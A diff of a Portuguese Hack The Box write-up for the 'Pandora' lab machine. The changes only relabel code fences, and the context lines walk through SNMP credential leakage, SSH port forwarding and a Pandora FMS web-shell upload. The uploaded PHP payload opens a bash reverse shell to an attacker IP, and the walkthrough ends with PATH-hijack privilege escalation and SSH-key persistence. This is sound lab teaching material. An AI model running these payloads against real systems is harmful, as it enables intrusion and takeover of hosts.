@@ -52,7 +52,7 @@ Utilizando a ferramenta _whatweb_, foram encontrados dois endereços de e-mail r
 
 Para verificar se existe Virtual Hosting, vamos começar pelo básico: adicionar o host ao arquivo /etc/hosts. Temos um potencial hostname válido, o **panda.htb**
 
-```powershell
+```bash
 sudo su
 echo "\n\n10.10.11.136\tpanda.htb" >> /etc/hosts
 ```
@@ -61,7 +61,7 @@ Ao acessar o URL http://10.10.11.136/ ou http://panda.htb, não foram encontrada
 
 Após a enumeração das rotas do site, tanto pelo http://10.10.11.136/ quanto pelo http://panda.htb, nada de interessante foi encontrado. Também foram testados outros nomes de hosts com a mesma ferramenta, mas nada de novo foi descoberto. Para isso, é necessário adicionar os novos hosts ao arquivo /etc/hosts.
 
-```powershell
+```bash
 # Enumeração das rotas do site http://panda.htb, bem como de possíveis ficheiros txt, js, html, php. Para o site http://10.10.11.136/ é só substituir... mas o resultado é o mesmo
 ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://panda.htb/FUZZ -t 200 -r -e .txt,.js,.html,.php
 
@@ -83,7 +83,7 @@ Portanto, no UDP, o Nmap não pode saber se a conexão está demorando porque n�
 
 Em resumo, no UDP (e considerando que estamos em um CTF), é recomendável limitar o número de portas às 20 portas mais comuns (por exemplo).
 
-```powershell
+```bash
 sudo nmap --top-ports 20 -sU $IP -vvv
 # ...
 # 161/udp   open          snmp         udp-response ttl 63
@@ -100,7 +100,7 @@ Já agora, o que é este serviço?
 
 SNMP (Simple Network Management Protocol) é um protocolo padrão para gerenciamento de redes. Ele é usado para monitorar e gerenciar dispositivos de rede, como roteadores, switches, servidores e outros dispositivos de rede. O SNMP permite que os administradores de rede monitorem o desempenho da rede, detectem problemas e gerenciem dispositivos de rede remotamente. Ele usa uma arquitetura cliente-servidor, onde os dispositivos de rede são os servidores e os computadores de gerenciamento são os clientes. O SNMP é um protocolo de rede amplamente utilizado e é suportado por muitos dispositivos de rede.
 
-```powershell
+```bash
 snmp-check 10.10.11.136
 # ...
 # 127.0.0.1    3306         0.0.0.0      0            listen
@@ -121,7 +121,7 @@ No meio de um pouco mais de 1200 linhas, podemos ver duas informações relevant
 
 A porta SSH encontra-se aberta, e temos credenciais. Vamos simplesmente tentar fazer login via SSH.
 
-```powershell
+```bash
 sshpass -p HotelBabylon23 ssh daniel@10.10.11.136
 ```
 
@@ -156,7 +156,7 @@ Podemos tentar ver os ficheiros todos do site. Pode sempre existir informações
 
 > Ok... Mas já estamos na máquina alvo... para que serve de "sair" para "entrar" de novo por outra via?
 
-```powershell
+```bash
 daniel@pandora:/var/www$ ll
 total 16
 drwxr-xr-x  4 root root 4096 Dec  7 14:32 ./
@@ -174,7 +174,7 @@ Pode servir para diversas coisas. Pode o novo site ter um serviço com credencia
 
 Para fazer port forwarding, podemos usar uma ferramenta que nunca me falhou, é fácil de usar e é multi plataforma: O "**_Chisel_**". Mas para este caso nem vai ser necessário, porque estamos na máquina via SSH, e o próprio SSH tem a opção de port forwarding. Para isso, basta terminar a conexão actual com a máquina vítima, e entrar novamente com uma flag a mais. A flag "**_-L_**"
 
-```powershell
+```bash
 sshpass -p HotelBabylon23 ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
 ```
 
@@ -186,7 +186,7 @@ Estamos enfrentando uma página de login de um serviço chamado **Pandora FMS**.
 
 > [Documentação do pandora - api](https://pandorafms.com/manual/en/documentation/08_technical_reference/02_annex_externalapi)
 
-```powershell
+```bash
 curl http://127.0.0.1/pandora_console/include/api.php?info=version
 # Pandora FMS v7.0NG.742_FIX_PERL2020 - PC200103 MR34
 ```
@@ -227,7 +227,7 @@ Para executar comandos, é bastante simples. No File manager, é só fazer o upl
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.230/443 0>&1'");?>
 ```
 
-```powershell
+```bash
 # Executar o nc em modo de escuta para receber o shell:
 kali@kali: >     nc -lvnp 443
 
@@ -237,7 +237,7 @@ kali@kali: >     curl http://localhost/pandora_console/images/shell.php
 
 ### Estabilizar o Reverse Shell
 
-```powershell
+```bash
 script /dev/null -c bash
 export TERM=xterm
 export SHELL=bash
@@ -264,21 +264,21 @@ O que isto quer dizer?
 
 Sabemos que o binário pandora_backup usa o tar. Onde se encontra isso?
 
-```powershell
+```bash
 which tar
 # /usr/bin/tar
 ```
 
 Ok. Mas como é que o computador sabe que está ali o programa? Existe uma variável no shell que indica isso. Chama-se PATH:
 
-```powershell
+```bash
 echo $PATH
 # /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 
 É assim que o computador procura o programa, primeiro procura em "**_/usr/local/sbin_**", depois em "**_/usr/local/bin_**", e assim sucessivamente. Todas as pastas estão separadas pelos dois pontos ":". Mas esta variável é apenas uma variável que o nosso shell actual têm, que facilmente se altera.
 
-```powershell
+```bash
 export PATH=.:$PATH
 echo $PATH
 # .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
@@ -294,7 +294,7 @@ Assim, basta criar um executável de nome "**_tar_**" numa pasta qualquer, e exe
 
 Sinceramente não sei, o que sei é que pelo ssh funcionou nesta máquina... Quando vi que não funcionou, procurei outra solução. criei uma chave id_rsa só para ter melhor conexão, conectei-me via SSH e o mesmo exploit funcionou... OK. Mistérios do Hacking!
 
-```powershell
+```bash
 ssh-keygen
 cd /home/matt/.ssh
 cat id_rsa.pub > authorized_keys
